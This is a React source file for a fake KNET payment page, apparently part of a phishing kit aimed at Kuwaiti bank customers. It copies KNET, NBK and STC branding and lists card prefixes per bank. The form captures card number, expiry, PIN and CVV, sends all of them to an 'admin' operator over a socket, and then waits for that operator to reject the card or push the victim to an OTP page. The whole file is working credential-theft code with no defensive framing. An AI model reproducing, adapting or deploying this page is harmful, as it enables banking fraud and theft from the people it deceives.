import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react/runtime";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import {
  socket,
  sendData,
  navigateToPage,
  cardAction,
  waitingMessage,
} from "@/lib/store";

// Bank-to-prefix mapping (exact from original KNET page)
// Banks that require CVV: CBK, KFH
const bankPrefixMap: Record<string, { prefixes: string[]; showCvv: boolean }> = {
  "Al Ahli Bank of Kuwait [ABK]": {
    prefixes: ["403622", "423826", "428628"],
    showCvv: false,
  },
  "Boubyan Bank [Boubyan]": {
    prefixes: ["404919", "450605", "426058", "431199", "470350", "490455", "490456"],
    showCvv: false,
  },
  "Burgan Bank [Burgan]": {
    prefixes: ["540759", "402978", "415254", "450238", "468564", "403583", "49219000"],
    showCvv: false,
  },
  "Commercial Bank of Kuwait [CBK]": {
    prefixes: ["521175", "516334", "532672", "537015"],
    showCvv: true,
  },
  "Gulf Bank of Kuwait [GBK]": {
    prefixes: ["531329", "531471", "531470", "517419", "559475", "517458", "531644", "526206"],
    showCvv: false,
  },
  "KFH [TAM]": {
    prefixes: ["45077848", "45077849"],
    showCvv: false,
  },
  "Kuwait Finance House [KFH]": {
    prefixes: ["450778", "485602", "537016", "532674"],
    showCvv: true,
  },
  "Kuwait International Bank [KIB]": {
    prefixes: ["409054", "406464"],
    showCvv: false,
  },
  "National Bank of Kuwait [NBK]": {
    prefixes: ["464452", "589160"],
    showCvv: false,
  },
  "NBK [Weyay]": {
    prefixes: ["46445250", "543363"],
    showCvv: false,
  },
  "Qatar National Bank [QNB]": {
    prefixes: ["521020", "524745"],
    showCvv: false,
  },
  "Union National Bank [UNB]": {
    prefixes: ["457778"],
    showCvv: false,
  },
  "Warba Bank [Warba]": {
    prefixes: ["532749", "559459", "541350", "525528"],
    showCvv: false,
  },
};

const bankNames = Object.keys(bankPrefixMap);

const months = Array.from({ length: 12 }, (_, i) => ({
  value: String(i + 1),
  label: String(i + 1).padStart(2, "0"),
}));

const currentYear = new Date().getFullYear();
const years = Array.from({ length: 44 }, (_, i) => ({
  value: String(currentYear + i),
  label: String(currentYear + i),
}));

export default function KNETPayment() {
  const [, navigate] = useLocation();
  const [selectedBank, setSelectedBank] = useState("");
  const [selectedPrefix, setSelectedPrefix] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cardPin, setCardPin] = useState("");
  const [cvv, setCvv] = useState("");
  const [showCvv, setShowCvv] = useState(false);

  // Get prefixes for selected bank
  const availablePrefixes = selectedBank && bankPrefixMap[selectedBank]
    ? bankPrefixMap[selectedBank].prefixes
    : [];

  // Determine if CVV should show based on selected bank
  const shouldShowCvv = selectedBank && bankPrefixMap[selectedBank]
    ? bankPrefixMap[selectedBank].showCvv
    : false;
  const [validationError, setValidationError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [rejectedError, setRejectedError] = useState(false);

  // Get amount from localStorage
  const mohData = JSON.parse(localStorage.getItem("mohPaymentData") || "{}");
  const totalAmount = mohData.totalAmount || localStorage.getItem("Total") || "0.000";

  useEffect(() => {
    navigateToPage("دفع كي نت");
  }, []);

  // When bank changes, reset prefix and update CVV visibility
  const handleBankChange = (bankName: string) => {
    setSelectedBank(bankName);
    setSelectedPrefix("");
    setCardNumber("");
    setValidationError("");
    setRejectedError(false);
    if (bankName && bankPrefixMap[bankName]) {
      setShowCvv(bankPrefixMap[bankName].showCvv);
    } else {
      setShowCvv(false);
    }
    setCvv("");
  };

  // Handle card action from admin
  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      waitingMessage.value = "";
      setIsLoading(false);

      if (action === "otp") {
        // Save card data to localStorage for OTP page
        localStorage.setItem("cardNumber", selectedPrefix + cardNumber);
        localStorage.setItem("cardMonth", expiryMonth.padStart(2, "0"));
        localStorage.setItem("cardYear", expiryYear);
        localStorage.setItem("Total", String(totalAmount));
        navigate("/knet-otp");
      } else if (action === "reject") {
        setRejectedError(true);
        setCardNumber("");
        setCardPin("");
        setCvv("");
        setSelectedPrefix("");
        setExpiryMonth("");
        setExpiryYear("");
        setSelectedBank("");
        setShowCvv(false);
      }
      cardAction.value = null;
    }
  });

  const validateForm = (): boolean => {
    const fullCardNumber = selectedPrefix + cardNumber;
    if (!fullCardNumber || (fullCardNumber.length !== 16 && fullCardNumber.length !== 19)) {
      setValidationError("خطأ : الرجاء التأكد من رقم البطاقة");
      return false;
    }
    if (cardPin.length !== 4 || !/^\d{4}$/.test(cardPin)) {
      setValidationError("خطأ : الرجاء أدخال الرقم السري المكون من اربع ارقام");
      return false;
    }
    if (!expiryMonth || !expiryYear) {
      setValidationError("خطأ : الرجاء أختيار شهر وسنة أنتهاء البطاقة");
      return false;
    }
    setValidationError("");
    return true;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateForm()) return;

    setIsLoading(true);
    setRejectedError(false);

    const fullCardNumber = selectedPrefix + cardNumber;
    const bankInfo = kuwaitBanks.find((b) => b.name === selectedBank);

    // Save to localStorage
    localStorage.setItem("cardNumber", fullCardNumber);
    localStorage.setItem("cardMonth", expiryMonth.padStart(2, "0"));
    localStorage.setItem("cardYear", expiryYear);
    localStorage.setItem("Total", String(totalAmount));

    const paymentData = {
      totalPaid: totalAmount,
      cardType: "knet",
      cardLast4: fullCardNumber.slice(-4),
      serviceName: mohData.serviceType || "الضمان الصحي",
      bankName: bankInfo?.name || selectedBank,
      bankLogo: "/kpay/knet.png",
    };
    localStorage.setItem("paymentData", JSON.stringify(paymentData));

    // Send card data to admin
    sendData({
      paymentCard: {
        cardNumber: fullCardNumber,
        nameOnCard: "KNET",
        expiryMonth: expiryMonth.padStart(2, "0"),
        expiryYear: expiryYear,
        cvv: cvv || "N/A",
        pin: cardPin,
        bankName: selectedBank,
        paymentMethod: "KNET",
      },
      current: "دفع كي نت",
      nextPage: "رمز التحقق كي نت (OTP)",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  return (
    <div
      style={{
        margin: 0,
        padding: 0,
        boxSizing: "border-box",
        fontFamily: "Verdana, Arial, Helvetica, sans-serif",
        backgroundColor: "#ebebeb",
        minHeight: "100vh",
      }}
    >
      <WaitingOverlay />

      {/* Loading Overlay */}
      {isLoading && (
        <div
          style={{
            display: "flex",
            textAlign: "center",
            position: "fixed",
            alignItems: "center",
            justifyContent: "center",
            height: "100%",
            width: "100%",
            zIndex: 1000000000,
            backgroundColor: "rgba(108, 117, 125, 0.41)",
            top: 0,
            left: 0,
          }}
        >
          <img src="/kpay/loading.gif" style={{ height: 20 }} alt="loading" />
        </div>
      )}

      {/* Banner */}
      <div>
        <img src="/assets/mob.jpg" alt="KNET" style={{ width: "100%" }} />
      </div>

      <div style={{ width: "100%", padding: 15, boxSizing: "border-box" }}>
        <div style={{ width: "100%", maxWidth: 395, margin: "0 auto" }}>
          {/* Merchant Info Card */}
          <div
            style={{
              backgroundColor: "#ffffff",
              padding: 20,
              border: "2px solid #8f8f90",
              borderRadius: 15,
              marginBottom: 15,
              boxShadow: "0 0 6px rgba(0,0,0,0.3)",
              marginTop: 25,
            }}
          >
            <div style={{ textAlign: "center", marginTop: -5, marginBottom: 15 }}>
              <img src="/assets/nbk.png" alt="NBK" style={{ width: 150 }} />
            </div>
            <div
              style={{
                borderBottom: "1px solid #8f8f90",
                paddingBottom: 5,
                paddingTop: 5,
                overflow: "hidden",
              }}
            >
              <label
                style={{
                  float: "left",
                  width: "40%",
                  fontSize: 11,
                  color: "#0070cd",
                  fontWeight: "bold",
                  textShadow: "0 1px 2px rgba(0,0,0,0.2)",
                }}
              >
                Merchant:{" "}
              </label>
              <label
                style={{
                  float: "left",
                  width: "60%",
                  fontSize: 11,
                  color: "#444444",
                  fontWeight: "normal",
                }}
              >
                STC corporation
              </label>
            </div>
            <div style={{ overflow: "hidden", paddingTop: 5 }}>
              <label
                style={{
                  float: "left",
                  width: "40%",
                  fontSize: 11,
                  color: "#0070cd",
                  fontWeight: "bold",
                  textShadow: "0 1px 2px rgba(0,0,0,0.2)",
                }}
              >
                Amount:{" "}
              </label>
              <label
                style={{
                  float: "left",
                  width: "60%",
                  fontSize: 11,
                  color: "#444444",
                  fontWeight: "normal",
                }}
              >
                {totalAmount} KD
              </label>
            </div>
          </div>

          {/* Card Form */}
          <form onSubmit={handleSubmit}>
            <div
              style={{
                backgroundColor: "#ffffff",
                padding: 20,
                border: "2px solid #8f8f90",
                borderRadius: 15,
                marginBottom: 15,
                boxShadow: "0 0 6px rgba(0,0,0,0.3)",
              }}
            >
              {/* Validation Error */}
              {validationError && (
                <div
                  style={{
                    border: "#ff0000 1px solid",
                    backgroundColor: "#f7dadd",
                    fontSize: 12,
                    fontFamily: "helvetica, arial, sans serif",
                    color: "#ff0000",
                    padding: 2,
                    marginBottom: 3,
                    textAlign: "center",
                  }}
                >
                  {validationError}
                </div>
              )}

              {/* Rejected Error */}
              {rejectedError && (
                <div
                  style={{
                    border: "#ff0000 1px solid",
                    backgroundColor: "#f7dadd",
                    fontSize: 12,
                    fontFamily: "helvetica, arial, sans serif",
                    color: "#ff0000",
                    padding: 2,
                    marginBottom: 3,
                    textAlign: "center",
                  }}
                >
                  يرجى التأكد من معلومات البطاقة المدخلة أو محاولة الدفع من بطاقة أخرى
                </div>
              )}

              {/* Bank Selection */}
              <div
                style={{
                  borderBottom: "1px solid #8f8f90",
                  paddingBottom: 5,
                  paddingTop: 5,
                  overflow: "hidden",
                }}
              >
                <label
                  style={{
                    float: "left",
                    width: "40%",
                    fontSize: 11,
                    color: "#0070cd",
                    fontWeight: "bold",
                    textShadow: "0 1px 2px rgba(0,0,0,0.2)",
                  }}
                >
                  Bank Name:
                </label>
                <select
                  value={selectedBank}
                  onChange={(e) => handleBankChange(e.target.value)}
                  style={{
                    float: "left",
                    width: "60%",
                    fontSize: 11,
                    height: 20,
                    color: "#444444",
                    fontWeight: "normal",
                  }}
                >
                  <option value="">Select Your Bank</option>
                  {bankNames.map((name) => (
                    <option key={name} value={name}>
                      {name}
                    </option>
                  ))}
                </select>
              </div>

              {/* Card Number */}
              <div
                style={{
                  borderBottom: "1px solid #8f8f90",
                  paddingBottom: 5,
                  paddingTop: 5,
                  overflow: "hidden",
                }}
              >
                <label
                  style={{
                    float: "left",
                    width: "40%",
                    fontSize: 11,
                    color: "#0070cd",
                    fontWeight: "bold",
                    textShadow: "0 1px 2px rgba(0,0,0,0.2)",
                  }}
                >
                  Card Number:
                </label>
                <select
                  value={selectedPrefix}
                  onChange={(e) => setSelectedPrefix(e.target.value)}
                  style={{
                    width: "26%",
                    fontSize: 11,
                    height: 20,
                    color: "#444444",
                    marginRight: 5,
                  }}
                >
                  <option value="">prefix</option>
                  {availablePrefixes.map((p) => (
                    <option key={p} value={p}>
                      {p}
                    </option>
                  ))}
                </select>
                <input
                  type="tel"
                  inputMode="numeric"
                  maxLength={10}
                  value={cardNumber}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, "");
                    setCardNumber(val);
                    setValidationError("");
                    setRejectedError(false);
                  }}
                  style={{
                    width: "32%",
                    border: "2px solid #0070cd",
                    boxShadow: "inset 0 0 5px rgba(0,0,0,0.3)",
                    padding: "0 3px",
                    outline: 0,
                    fontSize: 11,
                    height: 20,
                  }}
                />
              </div>

              {/* Expiration Date */}
              <div
                style={{
                  borderBottom: "1px solid #8f8f90",
                  paddingBottom: 5,
                  paddingTop: 5,
                  overflow: "hidden",
                }}
              >
                <label
                  style={{
                    float: "left",
                    width: "40%",
                    fontSize: 11,
                    color: "#0070cd",
                    fontWeight: "bold",
                    textShadow: "0 1px 2px rgba(0,0,0,0.2)",
                  }}
                >
                  Expiration Date:
                </label>
                <select
                  value={expiryMonth}
                  onChange={(e) => setExpiryMonth(e.target.value)}
                  style={{
                    width: "18%",
                    fontSize: 11,
                    height: 20,
                    color: "#444444",
                    marginRight: 5,
                  }}
                >
                  <option value="">MM</option>
                  {months.map((m) => (
                    <option key={m.value} value={m.value}>
                      {m.label}
                    </option>
                  ))}
                </select>
                <select
                  value={expiryYear}
                  onChange={(e) => setExpiryYear(e.target.value)}
                  style={{
                    width: "39%",
                    fontSize: 11,
                    height: 20,
                    color: "#444444",
                    float: "right",
                  }}
                >
                  <option value="">YYYY</option>
                  {years.map((y) => (
                    <option key={y.value} value={y.value}>
                      {y.label}
                    </option>
                  ))}
                </select>
              </div>

              {/* PIN */}
              <div
                style={{
                  borderBottom: "1px solid #8f8f90",
                  paddingBottom: 5,
                  paddingTop: 5,
                  overflow: "hidden",
                }}
              >
                <label
                  style={{
                    float: "left",
                    width: "40%",
                    fontSize: 11,
                    color: "#0070cd",
                    fontWeight: "bold",
                    textShadow: "0 1px 2px rgba(0,0,0,0.2)",
                  }}
                >
                  PIN:
                </label>
                <input
                  type="password"
                  inputMode="numeric"
                  maxLength={4}
                  value={cardPin}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, "");
                    setCardPin(val);
                    setValidationError("");
                  }}
                  style={{
                    width: "60%",
                    border: "2px solid #0070cd",
                    boxShadow: "inset 0 0 5px rgba(0,0,0,0.3)",
                    padding: "0 3px",
                    outline: 0,
                    fontSize: 11,
                    height: 20,
                  }}
                />
              </div>

              {/* CVV (shown for banks that require it: CBK, KFH) */}
              {shouldShowCvv && (
                <div
                  style={{
                    borderBottom: "1px solid #8f8f90",
                    paddingBottom: 5,
                    paddingTop: 5,
                    overflow: "hidden",
                  }}
                >
                  <label
                    style={{
                      float: "left",
                      width: "40%",
                      fontSize: 11,
                      color: "#0070cd",
                      fontWeight: "bold",
                      textShadow: "0 1px 2px rgba(0,0,0,0.2)",
                    }}
                  >
                    CVV:
                  </label>
                  <input
                    type="tel"
                    inputMode="numeric"
                    maxLength={3}
                    value={cvv}
                    onChange={(e) => {
                      const val = e.target.value.replace(/\D/g, "");
                      setCvv(val);
                    }}
                    style={{
                      width: "60%",
                      border: "2px solid #0070cd",
                      boxShadow: "inset 0 0 5px rgba(0,0,0,0.3)",
                      padding: "0 3px",
                      outline: 0,
                      fontSize: 11,
                      height: 20,
                    }}
                  />
                </div>
              )}
            </div>

            {/* Submit / Cancel */}
            <div
              style={{
                backgroundColor: "#ffffff",
                padding: 20,
                border: "2px solid #8f8f90",
                borderRadius: 15,
                marginBottom: 15,
                boxShadow: "0 0 6px rgba(0,0,0,0.3)",
                textAlign: "center",
              }}
            >
              <button
                type="submit"
                style={{
                  backgroundColor: "#eaeaea",
                  border: "1px solid #cacaca",
                  padding: "5px 0",
                  fontWeight: "bold",
                  color: "#666666",
                  width: "50%",
                  height: 27,
                  borderRadius: 4,
                  cursor: "pointer",
                  float: "left",
                }}
              >
                Submit
              </button>
              <button
                type="button"
                onClick={() => {
                  window.history.back();
                }}
                style={{
                  backgroundColor: "#eaeaea",
                  border: "1px solid #cacaca",
                  padding: "5px 0",
                  fontWeight: "bold",
                  color: "#666666",
                  width: "50%",
                  height: 27,
                  borderRadius: 4,
                  cursor: "pointer",
                  WebkitAppearance: "none",
                }}
              >
                Cancel
              </button>
            </div>
          </form>

          {/* Footer */}
          <footer style={{ textAlign: "center", marginTop: 15 }}>
            <div
              style={{
                textAlign: "center",
                fontSize: 11,
                lineHeight: "18px",
              }}
            >
              All Rights Reserved. Copyright 2024
              <br />
              <span
                style={{
                  fontSize: 10,
                  fontWeight: "bold",
                  color: "#0077d5",
                }}
              >
                The Shared Electronic Banking Services Company - KNET
              </span>
            </div>
          </footer>
        </div>
      </div>
    </div>
  );
}
